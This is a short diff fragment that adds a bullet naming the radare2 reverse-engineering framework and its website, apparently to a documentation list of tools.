+    * radare2 (http://www.radare.org/)
+
+
